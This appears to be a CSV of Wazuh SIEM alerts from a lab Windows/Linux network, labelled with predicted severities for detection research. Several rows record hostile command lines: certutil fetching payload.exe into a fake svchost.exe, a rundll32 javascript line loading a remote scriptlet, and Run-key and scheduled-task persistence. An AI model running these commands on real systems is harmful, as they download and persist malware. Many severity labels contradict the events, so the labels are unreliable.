@timestamp,agent.name,agent.id,rule.id,rule.description,rule.level,rule.mitre.id,location,data.win.eventdata.commandLine,raw,severity_pred
2025-12-28T23:34:03.720Z,Endpoint2-Win,2,92052,Command prompt started by abnormal process,6,T1059.003,EventChannel,"\""cmd.exe\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\Users\ayoub\AppData\Local\Temp\svchost.exe","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 55, ""mail"": true, ""level"": 6, ""description"": ""Command prompt started by abnormal process"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""92052""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T23:34:03.720Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T23:34:03.720Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\\Users\\ayoub\\AppData\\Local\\Temp\\svchost.exe"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""12129"", ""utcTime"": ""2025-12-28 23:34:03.720""}}}}",critical
2025-12-28T09:52:23.985Z,Endpoint3-Win,1,91531,Legitimate service query,2,T1059.001,EventChannel,"\""powershell.exe\"" -Command \""Get-Service | Select-Object -First 5\""","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 59, ""mail"": false, ""level"": 2, ""description"": ""Legitimate service query"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""91531""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T09:52:23.985Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T09:52:23.985Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""powershell.exe\\\"" -Command \\\""Get-Service | Select-Object -First 5\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""5543"", ""utcTime"": ""2025-12-28 09:52:23.985""}}}}",medium
2025-12-30T03:04:34.886Z,Endpoint2-Win,2,92033,Scheduled task created,8,T1053.005,EventChannel,"schtasks /create /tn \""AdobeUpdate\"" /sc minute /mo 30 /tr \""C:\Users\ayoub\AppData\Local\Temp\updater.exe\"" /f","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 46, ""mail"": false, ""level"": 8, ""description"": ""Scheduled task created"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1053.005""]}, ""id"": ""92033""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T03:04:34.886Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T03:04:34.886Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""schtasks /create /tn \\\""AdobeUpdate\\\"" /sc minute /mo 30 /tr \\\""C:\\Users\\ayoub\\AppData\\Local\\Temp\\updater.exe\\\"" /f"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""5055"", ""utcTime"": ""2025-12-30 03:04:34.886""}}}}",low
2025-12-29T11:38:28.145Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 41, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T11:38:28.145Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T11:38:28.145Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T11:38:28.145+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-29T08:54:46.077Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 26, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T08:54:46.077Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T08:54:46.077Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T08:54:46.077+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-30T02:35:12.958Z,Endpoint1-Win,3,91531,Legitimate service query,2,T1059.001,EventChannel,"\""powershell.exe\"" -Command \""Get-Service | Select-Object -First 5\""","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 32, ""mail"": false, ""level"": 2, ""description"": ""Legitimate service query"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""91531""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T02:35:12.958Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T02:35:12.958Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""powershell.exe\\\"" -Command \\\""Get-Service | Select-Object -First 5\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""10534"", ""utcTime"": ""2025-12-30 02:35:12.958""}}}}",low
2025-12-30T15:16:18.792Z,Endpoint3-Win,1,91501,Windows update executed successfully,3,,EventChannel,"\""C:\Windows\System32\UsoClient.exe\"" StartScan","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 47, ""mail"": true, ""level"": 3, ""description"": ""Windows update executed successfully"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91501""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T15:16:18.792Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T15:16:18.792Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\UsoClient.exe\\\"" StartScan"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""8511"", ""utcTime"": ""2025-12-30 15:16:18.792""}}}}",critical
2025-12-30T13:54:10.064Z,Endpoint1-Win,3,91531,Legitimate service query,2,T1059.001,EventChannel,"\""powershell.exe\"" -Command \""Get-Service | Select-Object -First 5\""","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 14, ""mail"": true, ""level"": 2, ""description"": ""Legitimate service query"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""91531""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T13:54:10.064Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T13:54:10.064Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""powershell.exe\\\"" -Command \\\""Get-Service | Select-Object -First 5\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""8039"", ""utcTime"": ""2025-12-30 13:54:10.064""}}}}",critical
2025-12-29T12:01:26.274Z,Endpoint2-Win,2,92052,Command prompt started by abnormal process,6,T1059.003,EventChannel,"\""cmd.exe\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\Users\ayoub\AppData\Local\Temp\svchost.exe","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 22, ""mail"": true, ""level"": 6, ""description"": ""Command prompt started by abnormal process"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""92052""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T12:01:26.274Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T12:01:26.274Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\\Users\\ayoub\\AppData\\Local\\Temp\\svchost.exe"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""10468"", ""utcTime"": ""2025-12-29 12:01:26.274""}}}}",critical
2025-12-29T17:13:30.872Z,Endpoint2-Win,2,91530,User executed network diagnostics,2,,EventChannel,"\""C:\Windows\System32\ping.exe\"" 8.8.8.8 -n 2","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 58, ""mail"": true, ""level"": 2, ""description"": ""User executed network diagnostics"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91530""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T17:13:30.872Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T17:13:30.872Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ping.exe\\\"" 8.8.8.8 -n 2"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""1793"", ""utcTime"": ""2025-12-29 17:13:30.872""}}}}",critical
2025-12-28T07:15:02.641Z,Endpoint3-Win,1,91531,Legitimate service query,2,T1059.001,EventChannel,"\""powershell.exe\"" -Command \""Get-Service | Select-Object -First 5\""","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 2, ""mail"": false, ""level"": 2, ""description"": ""Legitimate service query"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""91531""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T07:15:02.641Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T07:15:02.641Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""powershell.exe\\\"" -Command \\\""Get-Service | Select-Object -First 5\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""3588"", ""utcTime"": ""2025-12-28 07:15:02.641""}}}}",medium
2025-12-29T09:14:33.000Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 13, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T09:14:33.000Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T09:14:33.000Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T09:14:33.000+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-30T16:14:09.665Z,Endpoint2-Win,2,92052,Command prompt started by abnormal process,6,T1059.003,EventChannel,"\""cmd.exe\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\Users\ayoub\AppData\Local\Temp\svchost.exe","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 6, ""mail"": true, ""level"": 6, ""description"": ""Command prompt started by abnormal process"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""92052""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T16:14:09.665Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T16:14:09.665Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\\Users\\ayoub\\AppData\\Local\\Temp\\svchost.exe"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""6905"", ""utcTime"": ""2025-12-30 16:14:09.665""}}}}",critical
2025-12-28T06:00:06.380Z,Endpoint1-Win,3,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 11, ""mail"": false, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T06:00:06.380Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T06:00:06.380Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""7493"", ""utcTime"": ""2025-12-28 06:00:06.380""}}}}",low
2025-12-30T04:51:53.716Z,Endpoint1-Win,3,91531,Legitimate service query,2,T1059.001,EventChannel,"\""powershell.exe\"" -Command \""Get-Service | Select-Object -First 5\""","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 42, ""mail"": false, ""level"": 2, ""description"": ""Legitimate service query"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""91531""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T04:51:53.716Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T04:51:53.716Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""powershell.exe\\\"" -Command \\\""Get-Service | Select-Object -First 5\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""12529"", ""utcTime"": ""2025-12-30 04:51:53.716""}}}}",low
2025-12-28T00:04:44.218Z,Endpoint3-Win,1,91512,Google Chrome update check executed,2,,EventChannel,"\""C:\Program Files\Google\Update\GoogleUpdate.exe\"" /c","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 38, ""mail"": false, ""level"": 2, ""description"": ""Google Chrome update check executed"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91512""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T00:04:44.218Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T00:04:44.218Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\\\"" /c"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""9510"", ""utcTime"": ""2025-12-28 00:04:44.218""}}}}",medium
2025-12-28T00:40:34.008Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 56, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T00:40:34.008Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T00:40:34.008Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T00:40:34.008+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-29T10:47:06.072Z,Endpoint2-Win,2,92041,Registry key modified suspiciously,10,T1112,EventChannel,"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d \""C:\Users\ayoub\AppData\Local\Temp\updater.exe\"" /f","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 47, ""mail"": true, ""level"": 10, ""description"": ""Registry key modified suspiciously"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1112""]}, ""id"": ""92041""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T10:47:06.072Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T10:47:06.072Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d \\\""C:\\Users\\ayoub\\AppData\\Local\\Temp\\updater.exe\\\"" /f"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""2678"", ""utcTime"": ""2025-12-29 10:47:06.072""}}}}",critical
2025-12-28T22:49:03.376Z,Endpoint3-Win,1,91512,Google Chrome update check executed,2,,EventChannel,"\""C:\Program Files\Google\Update\GoogleUpdate.exe\"" /c","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 25, ""mail"": true, ""level"": 2, ""description"": ""Google Chrome update check executed"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91512""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T22:49:03.376Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T22:49:03.376Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\\\"" /c"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""3181"", ""utcTime"": ""2025-12-28 22:49:03.376""}}}}",critical
2025-12-28T04:58:53.543Z,Endpoint2-Win,2,91532,Legitimate tasklist execution,2,T1059.003,EventChannel,"\""cmd.exe\"" /c tasklist /fi \""IMAGENAME eq svchost.exe\""","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 42, ""mail"": false, ""level"": 2, ""description"": ""Legitimate tasklist execution"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""91532""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T04:58:53.543Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T04:58:53.543Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c tasklist /fi \\\""IMAGENAME eq svchost.exe\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""8210"", ""utcTime"": ""2025-12-28 04:58:53.543""}}}}",low
2025-12-30T04:36:21.218Z,Endpoint1-Win,3,91512,Google Chrome update check executed,2,,EventChannel,"\""C:\Program Files\Google\Update\GoogleUpdate.exe\"" /c","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 59, ""mail"": false, ""level"": 2, ""description"": ""Google Chrome update check executed"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91512""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T04:36:21.218Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T04:36:21.218Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\\\"" /c"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""11093"", ""utcTime"": ""2025-12-30 04:36:21.218""}}}}",low
2025-12-30T14:37:14.222Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 9, ""mail"": true, ""level"": 3, ""description"": ""Apparmor DENIED"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""52002""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T14:37:14.222Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-30T14:37:14.222Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-30T14:37:14.222+01:00""}, ""full_log"": ""2025-12-28T23:17:27.131124+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960247.129:424): apparmor=\""DENIED\"" operation=\""open\"" class=\""file\"" profile=\""snap.firefox.firefox\"" name=\""/proc/pressure/memory\"" pid=11504 comm=\""MemoryPoller\"" requested_mask=\""r\"" denied_mask=\""r\"" fsuid=1001 ouid=0""}",critical
2025-12-29T18:55:53.747Z,Endpoint3-Win,1,91531,Legitimate service query,2,T1059.001,EventChannel,"\""powershell.exe\"" -Command \""Get-Service | Select-Object -First 5\""","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 21, ""mail"": true, ""level"": 2, ""description"": ""Legitimate service query"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""91531""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T18:55:53.747Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T18:55:53.747Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""powershell.exe\\\"" -Command \\\""Get-Service | Select-Object -First 5\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""3290"", ""utcTime"": ""2025-12-29 18:55:53.747""}}}}",critical
2025-12-28T20:10:05.660Z,Endpoint2-Win,2,92091,Suspicious rundll32 remote scriptlet execution,12,T1218.011,EventChannel,"\""C:\Windows\System32\rundll32.exe\"" javascript:\""..\mshtml,RunHTMLApplication \"";document.write();GetObject(\""script:http://192.168.100.20/s.sct\"")","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 39, ""mail"": true, ""level"": 12, ""description"": ""Suspicious rundll32 remote scriptlet execution"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1218.011""]}, ""id"": ""92091""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T20:10:05.660Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T20:10:05.660Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\rundll32.exe\\\"" javascript:\\\""..\\mshtml,RunHTMLApplication \\\"";document.write();GetObject(\\\""script:http://192.168.100.20/s.sct\\\"")"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""12815"", ""utcTime"": ""2025-12-28 20:10:05.660""}}}}",critical
